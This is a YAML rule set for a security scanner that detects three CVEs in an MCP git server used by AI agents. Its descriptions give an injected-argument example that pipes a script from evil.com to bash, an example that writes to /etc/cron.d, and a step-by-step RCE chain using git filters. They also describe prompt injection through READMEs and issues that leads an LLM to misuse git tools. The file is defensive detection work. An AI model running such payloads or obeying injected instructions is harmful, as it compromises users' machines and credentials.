# MEDUSA AI Security Rules - MCP Git Server CVEs (January 2026)
# Source: TheHackerNews, Anthropic Security Advisory
# CVEs: CVE-2025-68143, CVE-2025-68144, CVE-2025-68145
# Version: 1.0.0
# Last Updated: 2026-01-23

rules:
  # =============================================================================
  # CVE-2025-68143 - Path Traversal in git_init (CVSS 8.8)
  # =============================================================================

  - id: MEDUSA-MCP-GIT-001
    name: cve-2025-68143-git-init-path-traversal
    severity: CRITICAL
    category: path_traversal
    patterns:
      - "(?i)git_init.*path"
      - "(?i)def\\s+git_init\\s*\\("
      - "(?i)name\\s*[=:]\\s*['\"]git_init['\"]"
      - "(?i)tool.*git_init"
    message: "CVE-2025-68143: MCP git_init path traversal vulnerability"
    description: |
      The git_init tool in mcp-server-git allows creating Git repositories
      in arbitrary directories without proper path validation. An attacker
      can use prompt injection to create repos in sensitive locations like
      ~/.ssh or system directories, enabling RCE via malicious git configs.

      Attack chain:
      1. Use git_init to create repo in arbitrary directory
      2. Write malicious .git/config with clean filter
      3. Create .gitattributes to trigger filter
      4. Execute arbitrary code when git_add runs

      Fix: Update to mcp-server-git >= 2025.9.25 (git_init removed entirely)
    owasp_llm: "LLM03:2025"
    mitre_atlas: "AML.T0051"
    cwe: "CWE-22"
    cvss: 8.8
    fix: "Update mcp-server-git to version >= 2025.9.25"
    references:
      - "https://nvd.nist.gov/vuln/detail/CVE-2025-68143"

  - id: MEDUSA-MCP-GIT-002
    name: cve-2025-68143-vulnerable-version
    severity: CRITICAL
    category: vulnerable_dependency
    patterns:
      - "(?i)mcp-server-git.*['\"]\\s*[<:]\\s*['\"]?2025\\.9\\.2[0-4]"
      - "(?i)mcp-server-git@[0-9]+\\.[0-9]+\\.[0-9]+"
      - "(?i)['\"]mcp-server-git['\"]\\s*:\\s*['\"]\\^?[0-9]"
      - "(?i)pip\\s+install\\s+mcp-server-git(?!.*>=2025\\.9\\.25)"
    message: "CVE-2025-68143: Vulnerable mcp-server-git version"
    description: |
      mcp-server-git versions before 2025.9.25 are vulnerable to path traversal
      via the git_init tool. This allows arbitrary directory creation and
      can lead to remote code execution through malicious git configurations.
    owasp_llm: "LLM03:2025"
    cwe: "CWE-22"
    cvss: 8.8
    fix: "Upgrade mcp-server-git to version >= 2025.9.25"

  # =============================================================================
  # CVE-2025-68144 - Argument Injection in git_diff/git_checkout (CVSS 8.1)
  # =============================================================================

  - id: MEDUSA-MCP-GIT-003
    name: cve-2025-68144-argument-injection
    severity: CRITICAL
    category: command_injection
    patterns:
      - "(?i)git_diff.*\\$|git_diff.*\\{"
      - "(?i)git_checkout.*\\$|git_checkout.*\\{"
      - "(?i)subprocess.*git.*diff.*(?:user|input|param)"
      - "(?i)subprocess.*git.*checkout.*(?:user|input|param)"
      - "(?i)exec.*git\\s+(?:diff|checkout).*\\+"
    message: "CVE-2025-68144: MCP git argument injection vulnerability"
    description: |
      The git_diff and git_checkout tools in mcp-server-git pass unsanitized
      user arguments directly to Git CLI commands. An attacker can inject
      arbitrary git flags or shell metacharacters via prompt injection.

      Example attack:
      - git_diff with arg "--output=/etc/cron.d/evil"
      - git_checkout with arg "; curl evil.com/shell.sh | bash"

      Fix: Update to mcp-server-git >= 2025.12.18
    owasp_llm: "LLM03:2025"
    mitre_atlas: "AML.T0051"
    cwe: "CWE-88"
    cvss: 8.1
    fix: "Update mcp-server-git to version >= 2025.12.18"
    references:
      - "https://nvd.nist.gov/vuln/detail/CVE-2025-68144"

  - id: MEDUSA-MCP-GIT-004
    name: git-command-unsanitized-args
    severity: HIGH
    category: command_injection
    patterns:
      - "(?i)subprocess\\.(?:run|call|Popen).*\\[.*['\"]git['\"].*\\+.*(?:args|params|input)"
      - "(?i)execSync.*git.*\\$\\{|execSync.*git.*\\+"
      - "(?i)spawn\\(['\"]git['\"].*concat"
      - "(?i)git.*--.*=.*(?:request|body|query|param)\\."
    message: "Git command with unsanitized arguments - injection risk"
    description: |
      Git commands constructed with user-controlled arguments without
      proper sanitization. This can lead to argument injection attacks
      where malicious flags or shell metacharacters are injected.
    owasp_llm: "LLM03:2025"
    cwe: "CWE-88"

  # =============================================================================
  # CVE-2025-68145 - Path Traversal via --repository Flag (CVSS 7.1)
  # =============================================================================

  - id: MEDUSA-MCP-GIT-005
    name: cve-2025-68145-repository-flag-bypass
    severity: HIGH
    category: path_traversal
    patterns:
      - "(?i)--repository.*\\$|--repository.*\\{"
      - "(?i)-C\\s+.*(?:user|input|param)"
      - "(?i)git.*-C.*(?:request|body|query)"
      - "(?i)repository.*=.*(?:args|params|input)"
      - "(?i)git\\s+-C\\s*\\$"
      - "(?i)-C\\s*\\$\\w+"
    message: "CVE-2025-68145: MCP git --repository flag path traversal"
    description: |
      Missing validation of the --repository flag allows path traversal
      attacks that bypass intended repository restrictions. An attacker
      can access files outside the allowed repository directory.

      Fix: Update to mcp-server-git >= 2025.12.18
    owasp_llm: "LLM03:2025"
    mitre_atlas: "AML.T0051"
    cwe: "CWE-22"
    cvss: 7.1
    fix: "Update mcp-server-git to version >= 2025.12.18"
    references:
      - "https://nvd.nist.gov/vuln/detail/CVE-2025-68145"

  # =============================================================================
  # MALICIOUS GIT CONFIG ATTACKS (RCE via filters)
  # =============================================================================

  - id: MEDUSA-MCP-GIT-006
    name: malicious-git-config-filter
    severity: CRITICAL
    category: rce
    patterns:
      - "(?i)\\[filter\\s*['\"]"
      - "(?i)filter\\..*\\.clean\\s*="
      - "(?i)filter\\..*\\.smudge\\s*="
      - "(?i)core\\.hooksPath\\s*="
      - "(?i)core\\.sshCommand\\s*="
    message: "Malicious git config - potential RCE via filter/hook"
    description: |
      Git config entries that can execute arbitrary code:
      - filter.*.clean/smudge: Execute commands on git add/checkout
      - core.hooksPath: Override git hooks directory
      - core.sshCommand: Execute commands on git push/pull

      This is part of the CVE-2025-68143 attack chain where attackers
      create malicious .git/config files to achieve RCE.
    owasp_llm: "LLM03:2025"
    cwe: "CWE-78"

  - id: MEDUSA-MCP-GIT-007
    name: gitattributes-filter-trigger
    severity: HIGH
    category: rce
    patterns:
      - "(?i)\\*\\s+filter\\s*="
      - "(?i)\\.\\*\\s+filter\\s*="
      - "(?i)text\\s+filter\\s*="
    message: ".gitattributes filter trigger - potential RCE"
    description: |
      .gitattributes files can trigger malicious git filters defined
      in .git/config. When combined with a malicious filter definition,
      this enables arbitrary code execution on git operations.
    owasp_llm: "LLM03:2025"
    cwe: "CWE-78"

  # =============================================================================
  # PROMPT INJECTION TO MCP GIT ATTACKS
  # =============================================================================

  - id: MEDUSA-MCP-GIT-008
    name: prompt-injection-git-attack
    severity: CRITICAL
    category: prompt_injection
    patterns:
      - "(?i)(?:readme|issue|comment).*git_init"
      - "(?i)(?:readme|issue|comment).*create.*repo.*/"
      - "(?i)please.*(?:init|create).*git.*(?:/etc|/root|~|\\.ssh)"
      - "(?i)helpful.*instruction.*git_init"
    message: "Prompt injection targeting MCP git tools"
    description: |
      Content that appears designed to trick an LLM into misusing
      MCP git tools via prompt injection. Attackers embed malicious
      instructions in READMEs, issues, or web pages that the LLM reads.

      As noted in CVE research: "an attacker who can influence what an
      AI assistant reads can weaponize these vulnerabilities."
    owasp_llm: "LLM01:2025"
    cwe: "CWE-74"

  - id: MEDUSA-MCP-GIT-009
    name: git-sensitive-directory-access
    severity: CRITICAL
    category: path_traversal
    patterns:
      - "(?i)git.*(?:init|clone).*(?:\\.ssh|credentials|aws|config)"
      - "(?i)git.*(?:init|clone).*/(?:etc|root|home)"
      - "(?i)git.*-C.*/(?:etc|var|usr)"
      - "(?i)repository.*(?:~|\\.\\./\\.\\./)"
    message: "Git operation targeting sensitive directory"
    description: |
      Git operation attempting to access or create repositories in
      sensitive system directories. This is a common pattern in
      MCP git exploitation chains.
    owasp_llm: "LLM03:2025"
    cwe: "CWE-22"

  # =============================================================================
  # GENERAL MCP GIT SECURITY
  # =============================================================================

  - id: MEDUSA-MCP-GIT-010
    name: mcp-git-no-path-validation
    severity: HIGH
    category: input_validation
    patterns:
      # Only flag in MCP git tool context - requires git function names
      - "(?i)def\\s+(?:git_init|git_clone|git_checkout|git_status|git_diff|git_commit).*:\\s*$"
      # Path assignment in git-related functions (not generic args)
      - "(?i)(?:git_path|repo_path|clone_path|checkout_path)\\s*=\\s*(?:args|params|input)"
    message: "MCP git tool without path validation"
    description: |
      MCP git tool implementation that accepts paths without proper
      validation. All path parameters should be validated against
      an allowlist of permitted directories.
    owasp_llm: "LLM03:2025"
    cwe: "CWE-22"

  - id: MEDUSA-MCP-GIT-011
    name: mcp-git-subprocess-shell
    severity: CRITICAL
    category: command_injection
    patterns:
      - "(?i)subprocess.*shell\\s*=\\s*True.*git"
      - "(?i)subprocess.*git.*shell\\s*=\\s*True"
      - "(?i)subprocess\\.run\\s*\\(\\s*['\"]git"
      - "(?i)os\\.system.*git"
      - "(?i)exec.*\\(.*git.*\\$"
    message: "MCP git using shell=True - command injection risk"
    description: |
      MCP git tool using shell=True or os.system() for git commands.
      This is highly dangerous as it enables command injection attacks.
      Always use subprocess with shell=False and argument lists.
    owasp_llm: "LLM03:2025"
    cwe: "CWE-78"

  - id: MEDUSA-MCP-GIT-012
    name: mcp-git-tool-missing-allowlist
    severity: MEDIUM
    category: input_validation
    patterns:
      - "(?i)git.*(?:branch|tag|remote).*(?:args|params|input)"
      - "(?i)git.*(?:push|pull|fetch).*(?:user|request)"
    message: "MCP git tool without command allowlist"
    description: |
      MCP git tool that doesn't restrict which git subcommands can
      be executed. Implement an allowlist of permitted git operations.
    owasp_llm: "LLM03:2025"
    cwe: "CWE-20"
